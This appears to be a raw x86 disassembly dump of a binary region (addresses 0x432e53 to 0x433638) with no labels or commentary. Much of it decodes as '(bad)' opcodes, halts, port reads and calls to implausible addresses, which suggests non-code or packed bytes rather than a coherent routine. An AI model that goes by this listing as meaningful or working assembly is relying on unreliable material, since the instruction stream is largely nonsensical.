  432e53:	retf   0x1807
  432e56:	ret    0x9b4d
  432e59:	mov    esi,DWORD PTR [edx]
  432e5b:	or     al,0x33
  432e5d:	into   
  432e5e:	add    edx,esi
  432e60:	add    ecx,edx
  432e62:	bswap  eax
  432e64:	ror    esi,0x98
  432e67:	dec    ebp
  432e68:	add    cl,ch
  432e6a:	mov    edi,edi
  432e6c:	hlt    
  432e6d:	inc    esi
  432e6f:	inc    ebp
  432e70:	ret    0x4533
  432e73:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432e79:	or     BYTE PTR [ebx],dh
  432e7b:	dec    ebp
  432e7c:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432e82:	jne    0xff8d2e49
  432e88:	inc    ebp
  432e89:	inc    ebp
  432e8a:	mov    esi,DWORD PTR [ebx]
  432e8c:	clc    
  432e8d:	pop    esi
  432e8e:	ret    0xcaeb
  432e91:	mov    eax,esi
  432e93:	call   0x52048366
  432e98:	dec    ebp
  432e99:	add    eax,0xf8728b
  432e9e:	adc    eax,0xce0ccac9
  432ea3:	push   ebp
  432ea4:	ret    0xc6ec
  432ea7:	in     al,dx
  432ea8:	call   0x33437bb1
  432ead:	push   edi
  432eae:	add    edi,eax
  432eb0:	xor    eax,eax
  432eb2:	jmp    0x432ef9
  432eb4:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432eba:	add    eax,edi
  432ebc:	shr    eax,cl
  432ebe:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432ec4:	mov    esi,DWORD PTR [edx]
  432ec6:	in     al,dx
  432ec7:	pushf  
  432ec8:	ret    0x84c7
  432ecb:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432ed1:	inc    ebp
  432ed2:	in     al,dx
  432ed3:	xor    DWORD PTR [ebp-0x64],eax
  432ed6:	mov    eax,edi
  432ed8:	cld    
  432ed9:	fmul   st(2),st
  432edb:	sbb    dl,al
  432edd:	jmp    0x9c3b:0x304d45c1
  432ee4:	jbe    0x432ead
  432ee6:	mov    esp,eax
  432ee8:	clc    
  432ee9:	add    BYTE PTR [ebp+0x0],cl
  432eec:	mov    ecx,ecx
  432eee:	lea    eax,[ebp-0x5]
  432ef1:	mov    edi,edi
  432ef3:	call   0x51ce833d
  432ef8:	hlt    
  432ef9:	xor    eax,edx
  432efb:	mov    esi,0x9b7284
  432f00:	xor    cl,dl
  432f02:	mov    esi,eax
  432f04:	hlt    
  432f05:	into   
  432f06:	inc    ebp
  432f07:	scas   eax,DWORD PTR es:[edi]
  432f08:	mov    ebp,ecx
  432f0a:	cld    
  432f0b:	add    dl,cl
  432f0d:	add    dl,al
  432f0f:	inc    ebp
  432f10:	shr    DWORD PTR [ebx],0x4d
  432f13:	xor    edi,DWORD PTR [ebx]
  432f15:	mov    DWORD PTR [edi],ecx
  432f17:	clc    
  432f18:	dec    esi
  432f19:	inc    ebp
  432f1a:	dec    DWORD PTR [ebx-0x3d2b1775]
  432f20:	ret    0xc6ca
  432f23:	mov    BYTE PTR [ebp-0x32],0x53
  432f27:	scas   eax,DWORD PTR es:[edi]
  432f28:	inc    ebp
  432f29:	jmp    0x432f5b
  432f2b:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432f32:	pop    ebx
  432f33:	xor    ecx,DWORD PTR [ebp+0x3]
  432f36:	mov    eax,DWORD PTR [ebx]
  432f38:	clc    
  432f39:	test   edx,ecx
  432f3b:	mov    ecx,esi
  432f3d:	cld    
  432f3e:	call   0x8ab77488
  432f43:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432f49:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432f4f:	fdiv   QWORD PTR [ebx]
  432f51:	retf   0xce89
  432f54:	in     al,0xc1
  432f56:	inc    ebp
  432f57:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432f5d:	into   
  432f5e:	mov    dh,0xc1
  432f61:	call   0x8c1774ea
  432f66:	(bad)  
  432f67:	cld    
  432f68:	mov    ecx,DWORD PTR [ebp-0x14]
  432f6b:	xor    eax,ecx
  432f6d:	lea    eax,[ebp+0x8]
  432f70:	mov    esi,DWORD PTR [edx-0x4]
  432f73:	add    dl,al
  432f75:	inc    ebp
  432f76:	mov    esp,0x32d89b8b
  432f7b:	dec    ebp
  432f7c:	mov    esi,DWORD PTR [ebx]
  432f7e:	cld    
  432f7f:	xor    eax,edx
  432f81:	sub    esp,DWORD PTR [ebp-0x75]
  432f84:	int    0xec
  432f86:	sub    ecx,eax
  432f88:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  432f8e:	mov    esi,esp
  432f90:	call   0x34177d19
  432f95:	inc    DWORD PTR [ebx]
  432f97:	mov    edi,DWORD PTR [ebx]
  432f99:	cld    
  432f9a:	jne    0x432fe9
  432f9c:	mov    esi,DWORD PTR [ebx]
  432f9e:	aam    0x8d
  432fa0:	dec    ebp
  432fa1:	or     BYTE PTR [ebx],dh
  432fa3:	jb     0x432fa8
  432fa5:	add    BYTE PTR [edi+0x45],bl
  432fa8:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  432faf:	xor    ebp,esp
  432fb1:	xor    eax,edi
  432fb3:	sub    edi,esp
  432fb5:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  432fbb:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  432fc2:	inc    ebp
  432fc3:	xor    ecx,DWORD PTR [ecx+0x45891403]
  432fc9:	clc    
  432fca:	mov    eax,edi
  432fcc:	nop
  432fcd:	fadd   QWORD PTR [eax]
  432fcf:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  432fd5:	jmp    0x432f60
  432fd7:	mov    eax,DWORD PTR [ecx]
  432fd9:	fadd   DWORD PTR [eax]
  432fdb:	inc    ebp
  432fdc:	or     DWORD PTR [ebx],esi
  432fde:	dec    eax
  432fdf:	add    edx,DWORD PTR [ebx-0x2d]
  432fe2:	dec    ebp
  432fe3:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  432fe9:	inc    ebp
  432fea:	push   esp
  432feb:	mov    dl,BYTE PTR [ecx-0xd]
  432fee:	xor    ecx,DWORD PTR [ebp-0x45]
  432ff1:	(bad)  
  432ff3:	rol    BYTE PTR [eax],0xc1
  432ff6:	ret    
  432ff7:	inc    ebp
  432ff8:	inc    ebp
  432ff9:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  432fff:	xor    eax,ebx
  433001:	add    eax,DWORD PTR [ebp+0x23]
  433004:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43300a:	cmp    edi,0xc
  43300d:	dec    ebp
  43300e:	inc    ebp
  43300f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433015:	inc    ebp
  433016:	mov    esi,DWORD PTR [ebx]
  433018:	clc    
  433019:	lea    eax,[ebp+0x45725407]
  43301f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433023:	xor    edi,DWORD PTR [eax]
  433025:	mov    ecx,0xff8b8d4d
  43302a:	push   esp
  43302b:	enter  0x4df7,0x23
  43302f:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433035:	mov    eax,DWORD PTR [ebx]
  433037:	loopne 0x433024
  433039:	ret    0xc68b
  43303c:	push   esp
  43303d:	enter  0x9745,0x8b
  433041:	inc    ebp
  433042:	cld    
  433043:	mov    eax,edi
  433045:	clc    
  433046:	ret    
  433047:	ret    0xc645
  43304a:	mov    esi,DWORD PTR [ebx]
  43304c:	cld    
  43304d:	pop    esi
  43304e:	mov    ebx,0x83458bc3
  433054:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  433058:	dec    ebp
  433059:	xor    DWORD PTR [ebx],esi
  43305b:	pushf  
  43305c:	add    edi,DWORD PTR [edx-0x7767a77]
  433062:	fcom   DWORD PTR [ebp+0x45]
  433065:	mov    esi,DWORD PTR [ebx]
  433067:	adc    al,0x9c
  433069:	inc    ebp
  43306a:	(bad)  
  43306b:	mov    ebx,eax
  43306d:	adc    al,0x85
  43306f:	cmp    al,0x1
  433072:	inc    ebp
  433073:	add    BYTE PTR ds:0xe98b9c4d,bh
  433079:	mov    eax,DWORD PTR [ebx]
  43307b:	nop
  43307c:	add    BYTE PTR [eax],al
  43307e:	inc    ebp
  43307f:	mov    esi,DWORD PTR [ebx]
  433081:	add    eax,DWORD PTR [ebx]
  433083:	cmp    al,0x89
  433085:	mov    esp,esi
  433087:	clc    
  433088:	inc    ebp
  433089:	inc    ebp
  43308a:	add    edx,DWORD PTR [esi+0xc]
  43308d:	mov    edi,0x7ff0845
  433092:	in     al,dx
  433093:	(bad)  
  433094:	jne    0x433031
  433096:	mov    esi,DWORD PTR [edx]
  433098:	clc    
  433099:	add    ebp,DWORD PTR [esi]
  43309b:	mov    edi,edi
  43309d:	in     al,dx
  43309e:	mov    DWORD PTR [ebp-0x10],eax
  4330a1:	xor    eax,DWORD PTR [ebp+0x3]
  4330a4:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4330aa:	fmul   DWORD PTR [ebx-0x173caf39]
  4330b0:	lea    ecx,[ecx+0x45e8d4bc]
  4330b6:	clc    
  4330b7:	mov    edi,edi
  4330b9:	cmp    BYTE PTR [ebp+0x4d],al
  4330bc:	test   DWORD PTR [eax+0x74],ecx
  4330bf:	inc    ecx
  4330c0:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4330c6:	ret    
  4330c7:	inc    eax
  4330c8:	dec    DWORD PTR [ebx+0x4945f8f0]
  4330ce:	push   eax
  4330cf:	dec    eax
  4330d0:	test   al,0xd0
  4330d2:	dec    eax
  4330d4:	mov    eax,DWORD PTR [ebp-0x14]
  4330d7:	mov    eax,DWORD PTR [ebp+0x38]
  4330da:	mov    eax,ecx
  4330dc:	fadd   DWORD PTR [ebx]
  4330de:	dec    ebp
  4330df:	inc    eax
  4330e0:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4330e6:	inc    ebp
  4330e7:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  4330ed:	fadd   QWORD PTR [ebx]
  4330ef:	inc    ebp
  4330f0:	or     al,0x33
  4330f2:	dec    ebp
  4330f3:	add    edi,DWORD PTR [ebx]
  4330f5:	mov    DWORD PTR [edx-0x28],esi
  4330f8:	mov    eax,DWORD PTR [ebp-0x10]
  4330fb:	mov    eax,DWORD PTR [eax+0x10]
  4330fe:	mov    eax,edi
  433100:	lock ret 
  433102:	inc    ecx
  433103:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433109:	fsubr  st,st(5)
  43310b:	test   DWORD PTR [eax],eax
  43310d:	clc    
  43310e:	push   0x45
  433110:	(bad)  
  433111:	cmp    al,0xec
  433113:	pushf  
  433114:	inc    ebp
  433115:	(bad)  
  433116:	push   eax
  433117:	fsub   DWORD PTR [eax-0x7b]
  43311a:	(bad)  
  43311b:	clc    
  43311c:	mov    eax,0xf8008584
  433121:	mov    eax,DWORD PTR [ebp-0x4]
  433124:	mov    edi,0x4585c3cc
  43312a:	clc    
  43312b:	mov    eax,DWORD PTR [ebp+0x14]
  43312e:	xor    eax,DWORD PTR [ebp-0x64]
  433131:	mov    edi,eax
  433133:	in     al,dx
  433134:	les    esi,FWORD PTR [ebp-0x7b]
  433137:	mov    edi,eax
  433139:	or     al,0x4d
  43313b:	dec    ebp
  43313c:	mov    eax,ebp
  43313e:	in     al,0xf2
  433140:	dec    ebp
  433141:	dec    DWORD PTR [ecx+0x4dc7e045]
  433147:	fmul   DWORD PTR [ecx+0x4df8f085]
  43314d:	inc    ebp
  43314e:	mov    DWORD PTR [ebx],esi
  433150:	fadd   QWORD PTR [ebx]
  433152:	dec    ebp
  433153:	push   eax
  433154:	xor    eax,DWORD PTR [ebp+0x3]
  433157:	push   eax
  433158:	mov    DWORD PTR [eax+ebx*8],ebx
  43315b:	push   esi
  43315d:	mov    eax,DWORD PTR [eax]
  43315f:	lock cmp eax,0xf84e85c0
  433165:	inc    ebp
  433166:	test   BYTE PTR [ebx],dh
  433168:	add    DWORD PTR [ebx],eax
  43316a:	add    BYTE PTR [eax+0x4d],dl
  43316d:	jne    0x4331a2
  43316f:	lea    ecx,[ebx-0x7617fc44]
  433175:	div    ah
  433177:	inc    DWORD PTR [ebp+0x45]
  43317a:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433180:	jb     0x43310d
  433182:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433189:	mov    ecx,DWORD PTR [ebp-0x10]
  43318c:	xor    ecx,DWORD PTR [ebp+0x3]
  43318f:	mov    edi,DWORD PTR [ebx]
  433191:	adc    BYTE PTR [ebp+0x41],dh
  433194:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43319a:	ret    
  43319b:	push   ss
  43319c:	push   0x45
  43319e:	lea    ecx,[ebx+0x4de80cb0]
  4331a4:	sti    
  4331a5:	add    edi,edi
  4331a7:	or     BYTE PTR [ebp+0x4d],al
  4331aa:	mov    ebp,DWORD PTR [ebx]
  4331ac:	xor    ebp,ecx
  4331ae:	mov    al,BYTE PTR [edx]
  4331b0:	add    eax,0xc7200
  4331b5:	jne    0x433204
  4331b7:	lea    esi,[ebx]
  4331b9:	mov    al,0xf
  4331bb:	call   0xf2880
  4331c0:	shl    DWORD PTR [ecx],0x84
  4331c3:	pushf  
  4331c4:	add    DWORD PTR [ecx+0x4545d000],ecx
  4331ca:	mov    esi,DWORD PTR [edx]
  4331cc:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4331d3:	test   DWORD PTR [eax],eax
  4331d5:	clc    
  4331d6:	dec    ebp
  4331d7:	inc    ebp
  4331d8:	xor    edi,DWORD PTR [edi+ecx*1]
  4331db:	pushf  
  4331dc:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4331e3:	lea    eax,[ecx]
  4331e5:	int3   
  4331e6:	add    BYTE PTR [ebp+0x45],cl
  4331e9:	lea    ecx,[ebx-0x75b2cc38]
  4331ef:	lea    eax,ds:0x4d72c4
  4331f5:	mov    ecx,DWORD PTR [ebp-0x4]
  4331f8:	xor    ecx,edi
  4331fa:	bswap  ebx
  4331fc:	ror    BYTE PTR [ebp-0x35],0xe9
  433200:	rol    DWORD PTR [ecx],0x84
  433203:	add    BYTE PTR [ecx],al
  433205:	xor    eax,DWORD PTR [eax]
  433207:	pushf  
  433208:	inc    ebp
  433209:	jnp    0x8a43660c
  43320f:	mov    eax,DWORD PTR ds:0xcf72e8
  433215:	lock dec ebp
  433217:	retf   
  433218:	xor    ecx,DWORD PTR [ebp+0xf]
  43321b:	mov    eax,eax
  43321d:	fmul   st,st(3)
  43321f:	test   ecx,0x19b8484
  433225:	xor    al,BYTE PTR [eax]
  433227:	mov    DWORD PTR [ebp-0x28],eax
  43322a:	mov    eax,DWORD PTR [ebp+0x33]
  43322d:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433233:	ret    
  433234:	add    al,cl
  433236:	dec    ebp
  433237:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  43323d:	add    ecx,DWORD PTR ds:0xc7250
  433243:	inc    ebp
  433244:	rcl    DWORD PTR [eax+0x4d],0x2b
  433248:	mov    edi,edi
  43324a:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433250:	jb     0x433219
  433252:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  433259:	mov    esi,DWORD PTR [ebx]
  43325b:	cld    
  43325c:	mov    cl,bh
  43325e:	or     eax,0x372b6
  433263:	cmp    ecx,eax
  433265:	jne    0x4332e2
  43326b:	mov    eax,DWORD PTR [ebp-0x20]
  43326e:	mov    eax,DWORD PTR [eax]
  433270:	xor    eax,edi
  433272:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  433279:	mov    ecx,DWORD PTR [ebp-0x4]
  43327c:	mov    ecx,edi
  43327e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433284:	jb     0x433295
  433286:	add    BYTE PTR [edi-0x3f],dl
  433289:	add    BYTE PTR [ebp-0x75],cl
  43328c:	mov    esi,eax
  43328e:	xor    eax,DWORD PTR [eax]
  433290:	mov    al,bh
  433292:	or     eax,0x4b7284
  433297:	xor    al,cl
  433299:	mov    ecx,DWORD PTR [ebp-0x4]
  43329c:	mov    ecx,edi
  43329e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4332a4:	jb     0x4332b5
  4332a6:	add    BYTE PTR [edi],dh
  4332a8:	enter  0x8500,0x8b
  4332ac:	add    ah,bl
  4332ae:	add    BYTE PTR [eax],al
  4332b0:	inc    ebp
  4332b1:	(bad)  
  4332b2:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4332b9:	mov    esi,DWORD PTR [edx-0x4]
  4332bc:	add    bh,cl
  4332be:	dec    ebp
  4332bf:	mov    dh,0x8b
  4332c1:	add    esi,DWORD PTR [ebx]
  4332c3:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4332c9:	add    BYTE PTR [eax],al
  4332cb:	mov    eax,ecx
  4332cd:	loopne 0x43331c
  4332cf:	add    BYTE PTR [ebx-0x757bcc39],cl
  4332d5:	dec    ebx
  4332d6:	or     eax,0x8b7232
  4332db:	in     al,0xc1
  4332dd:	or     DWORD PTR [ebp-0x31],ecx
  4332e0:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4332e7:	xor    dh,BYTE PTR [edx-0x75]
  4332ea:	add    al,dh
  4332ec:	enter  0x4f09,0xcf
  4332f0:	inc    ebp
  4332f1:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4332f7:	or     al,BYTE PTR ds:0xe4728b
  4332fd:	or     DWORD PTR [ebp-0x31],ecx
  433300:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433307:	cmp    dh,BYTE PTR [edx+0xf]
  43330a:	add    bl,dl
  43330c:	rol    DWORD PTR [eax],0x4d
  43330f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433315:	(bad)  
  433316:	or     eax,0x4b7284
  43331b:	xor    al,cl
  43331d:	mov    ecx,DWORD PTR [ebp-0x20]
  433320:	mov    ecx,DWORD PTR [ecx]
  433322:	xor    ecx,edi
  433324:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43332b:	xor    cl,al
  43332d:	mov    ecx,DWORD PTR [edi]
  43332f:	fadd   QWORD PTR [ebp+0x9]
  433332:	call   0xffd02e06
  433337:	dec    ebx
  433338:	dec    ebp
  433339:	xor    bh,BYTE PTR [ebx]
  43333b:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  43333f:	loopne 0x43333d
  433341:	or     edi,eax
  433343:	iret   
  433344:	ret    
  433345:	mov    WORD PTR [ebp+0x4f],es
  433348:	mov    esi,DWORD PTR [edx]
  43334a:	call   0x8452fa89
  43334f:	(bad)  
  433350:	fwait
  433351:	add    BYTE PTR [edx],dh
  433353:	mov    esi,DWORD PTR [ebx]
  433355:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43335b:	test   BYTE PTR [ebx],dh
  43335d:	dec    ebx
  43335e:	add    esi,DWORD PTR [edx]
  433360:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  433366:	dec    edi
  433368:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  43336f:	xor    al,BYTE PTR [ebx]
  433371:	mov    edi,DWORD PTR [ebx]
  433373:	in     al,0x75
  433375:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43337b:	dec    ebx
  43337c:	xor    esi,DWORD PTR [edx]
  43337e:	lea    ecx,[edx]
  433380:	or     BYTE PTR [ebx+0x900f072],cl
  433386:	ja     0x433357
  433388:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43338f:	cmp    ch,al
  433391:	jne    0x433386
  433393:	mov    edi,edi
  433395:	fadd   QWORD PTR [ebp+0x0]
  433398:	mov    eax,edi
  43339a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4333a1:	mov    edx,DWORD PTR [ebx]
  4333a3:	in     al,0x45
  4333a5:	or     DWORD PTR [ebx],esi
  4333a7:	iret   
  4333a8:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4333af:	xor    dl,BYTE PTR [eax-0x75]
  4333b2:	sbb    al,0xe0
  4333b4:	dec    DWORD PTR [ecx]
  4333b6:	mov    ecx,edi
  4333b8:	in     al,dx
  4333b9:	mov    eax,es
  4333bb:	dec    ebx
  4333bc:	mov    DWORD PTR [edx],esi
  4333be:	fmul   QWORD PTR [edx]
  4333c0:	jne    0x43334d
  4333c2:	(bad)  
  4333c3:	(bad)  
  4333c5:	or     DWORD PTR [ebp-0x31],eax
  4333c8:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4333cf:	cmp    bh,bh
  4333d1:	jne    0x433418
  4333d3:	lea    ecx,[ebx-0x38372750]
  4333d9:	inc    ebx
  4333db:	mov    eax,ecx
  4333dd:	mov    eax,0xa00c111
  4333e2:	jne    0x433429
  4333e4:	mov    esi,DWORD PTR [ebx]
  4333e6:	test   al,0x3
  4333e8:	inc    ebp
  4333e9:	mov    DWORD PTR [eax-0xc],edx
  4333ec:	loop   0x433433
  4333ee:	push   DWORD PTR [ebx]
  4333f0:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4333f6:	add    DWORD PTR [eax],eax
  4333f8:	mov    eax,edi
  4333fa:	lods   al,BYTE PTR ds:[esi]
  4333fb:	dec    ebp
  4333fc:	inc    ebp
  4333fd:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433403:	retf   
  433404:	mov    edx,ecx
  433406:	adc    al,0x84
  433408:	(bad)  
  433409:	std    
  43340a:	ret    
  43340b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433411:	hlt    
  433412:	rol    edi,0x82
  433415:	ret    
  433416:	cld    
  433417:	enter  0x11ff,0x45
  43341b:	inc    ebp
  43341c:	pop    edi
  43341d:	mov    ebx,DWORD PTR [ebx+0x14]
  433420:	ret    0xc7
  433423:	test   BYTE PTR [ebx+0x4532519b],cl
  433429:	jmp    0x4333b6
  43342b:	push   0x8
  43342d:	call   DWORD PTR [esi]
  43342f:	in     al,dx
  433430:	add    BYTE PTR [ebp+0x1],0x50
  433434:	add    bh,ah
  433436:	add    bh,bh
  433438:	icebp  
  433439:	mov    ecx,DWORD PTR [eax]
  43343b:	cld    
  43343c:	pop    es
  43343d:	dec    ebp
  43343e:	shl    DWORD PTR [ebx],0x72
  433441:	add    eax,DWORD PTR [eax]
  433443:	cmp    edx,ecx
  433445:	je     0x433457
  433447:	mov    esi,DWORD PTR [ebp-0x4]
  43344a:	inc    edi
  43344c:	or     al,0xc3
  43344e:	jmp    FWORD PTR [edx-0x18]
  433451:	(bad)  
  433452:	sti    
  433453:	cwde   
  433454:	(bad)  
  433455:	call   0xffa12d60
  43345a:	or     al,0x45
  43345c:	push   ebp
  43345d:	sub    esp,0x18
  433460:	push   ebx
  433461:	inc    ebp
  433462:	mov    edi,edi
  433464:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43346b:	test   al,0x54
  43346d:	inc    ebp
  43346e:	push   ecx
  43346f:	push   eax
  433470:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  433476:	add    ah,bh
  433478:	(bad)  
  433479:	dec    ebp
  43347a:	add    DWORD PTR [ebx],esi
  43347c:	inc    ebp
  43347d:	add    ecx,DWORD PTR [ebx+0x74943b]
  433483:	push   0xffffff8b
  433485:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43348b:	add    eax,DWORD PTR [ecx]
  43348d:	or     BYTE PTR [eax],al
  43348f:	call   0xff852c94
  433494:	mov    eax,DWORD PTR [ebp+0x14]
  433497:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43349d:	inc    ebp
  43349e:	dec    ecx
  43349f:	add    ebp,DWORD PTR [edx+0x14]
  4334a2:	push   0x8b3045
  4334a7:	call   0x33ad821c
  4334ac:	inc    DWORD PTR [ebx]
  4334ae:	mov    DWORD PTR [edi],ecx
  4334b0:	mov    eax,ecx
  4334b2:	or     BYTE PTR [ebp-0x3d],cl
  4334b5:	cmp    eax,edi
  4334b7:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4334bc:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4334c2:	adc    al,0xc9
  4334c4:	inc    ebp
  4334c5:	adc    BYTE PTR [eax+0x55],dl
  4334c8:	jne    0x4334b6
  4334ca:	call   0xff54345a
  4334cf:	dec    ebp
  4334d0:	inc    ebp
  4334d1:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4334d7:	add    BYTE PTR [ebx],bh
  4334d9:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4334dd:	push   esp
  4334de:	or     al,0x51
  4334e0:	dec    ebp
  4334e1:	xor    DWORD PTR [ebx],0xf32039b
  4334e7:	cmp    eax,DWORD PTR [ebp+0x74]
  4334ea:	mov    edi,edi
  4334ec:	pop    edi
  4334ed:	adc    BYTE PTR [ebx+0x75],bl
  4334f0:	ret    0x50
  4334f3:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4334f7:	(bad)  
  4334f8:	clc    
  4334f9:	mov    esp,ebp
  4334fb:	pop    ecx
  4334fc:	mov    ecx,0xf80085c2
  433501:	mov    ecx,DWORD PTR [ecx+edx*2]
  433504:	push   esi
  433505:	push   esi
  433506:	(bad)  
  433507:	lock add DWORD PTR [ebp+0x44],eax
  43350b:	mov    edx,DWORD PTR [eax]
  43350d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433511:	or     BYTE PTR [edi+eax*1+0x51],dl
  433515:	ret    
  433516:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43351c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433522:	or     al,0x80
  433524:	jge    0x433527
  433526:	mov    DWORD PTR [eax],eax
  433528:	and    al,0x8
  43352a:	cmp    DWORD PTR [ebp+0x10],eax
  43352d:	mov    edx,DWORD PTR [esi]
  43352f:	xchg   esp,eax
  433530:	dec    esp
  433531:	add    BYTE PTR [eax],dl
  433533:	mov    ecx,edx
  433535:	add    edx,DWORD PTR [esp+edi*1+0x8]
  433539:	dec    ebp
  43353a:	into   
  43353b:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433541:	mov    edx,DWORD PTR [eax+0x14]
  433544:	das    
  433545:	add    al,0x45
  433547:	add    BYTE PTR [ebp+0x0],dh
  43354a:	mov    edi,edi
  43354c:	and    al,0x50
  43354e:	mov    eax,DWORD PTR [eax]
  433550:	and    al,0xd1
  433552:	xor    eax,DWORD PTR [esi]
  433554:	lea    eax,[ebp+0x8]
  433557:	xor    esi,DWORD PTR [edx+0x3]
  43355a:	add    BYTE PTR [ecx+0x4510fc44],cl
  433560:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  433566:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433570:	cmp    al,0xff
  433572:	pushf  
  433573:	mov    edi,edi
  433575:	or     BYTE PTR [esi+ecx*1],cl
  433578:	jne    0x43353d
  43357a:	call   0xc3546
  43357f:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433583:	mov    ebx,DWORD PTR [eax]
  433585:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433589:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433591:	pop    esi
  433592:	and    al,0xc9
  433594:	and    al,0x10
  433596:	call   DWORD PTR [ebp-0x73]
  433599:	in     al,dx
  43359a:	jmp    esp
  43359c:	je     0x433521
  43359e:	call   DWORD PTR [eax]
  4335a0:	and    al,0x31
  4335a2:	call   0xffcd3443
  4335a7:	and    al,0x44
  4335a9:	push   edi
  4335aa:	or     al,0x41
  4335ac:	pop    esi
  4335ad:	mov    ebp,esp
  4335af:	and    al,0xc2
  4335b1:	mov    eax,DWORD PTR [eax]
  4335b3:	and    al,0x85
  4335b5:	mov    edx,0x733080e
  4335ba:	jne    0x4335b6
  4335bc:	test   DWORD PTR [ebx+0x3083275],ebx
  4335c2:	dec    DWORD PTR [ecx-0x74dbdb15]
  4335c8:	sbb    BYTE PTR [esp+edx*1],cl
  4335cb:	jl     0x4335cc
  4335cd:	adc    al,0x24
  4335cf:	dec    ebp
  4335d0:	mov    esi,DWORD PTR [ebp+0xc]
  4335d3:	mov    ecx,DWORD PTR [eax]
  4335d5:	and    al,0x39
  4335d7:	xor    ebx,DWORD PTR [ebx+ecx*4]
  4335da:	or     BYTE PTR [eax+edx*1],ah
  4335dd:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  4335e4:	clc    
  4335e5:	jmp    0x433583
  4335e7:	adc    al,bh
  4335e9:	inc    esp
  4335ea:	je     0x433638
  4335ec:	and    al,0xc2
  4335ee:	je     0x43358b
  4335f0:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  4335f6:	dec    DWORD PTR [ecx+0x235fbf08]
  4335fc:	sbb    al,0x10
  4335fe:	add    BYTE PTR [esi+edi*1+0x10],cl
  433602:	add    BYTE PTR [ebx+0xb],dh
  433605:	adc    BYTE PTR [eax],al
  433607:	mov    WORD PTR ds:0x3d450010,?
  43360d:	adc    BYTE PTR [eax],al
  43360f:	add    DWORD PTR [eax+edx*1],esp
  433612:	add    BYTE PTR [edx+0x6],cl
  433615:	adc    BYTE PTR [eax],al
  433617:	sub    dx,WORD PTR [eax]
  43361a:	add    bh,dl
  43361c:	imul   edx,DWORD PTR [eax],0x10302300
  433622:	add    BYTE PTR [esi-0x4ffef89],dl
  433628:	xor    eax,0x35ff0043
  43362d:	inc    ebx
  43362e:	add    BYTE PTR [ebx],al
  433630:	ss inc ebx
  433632:	add    BYTE PTR [edi],al
  433634:	ss inc ebx
  433636:	add    BYTE PTR [ebx],cl
  433638:	ss inc ebx
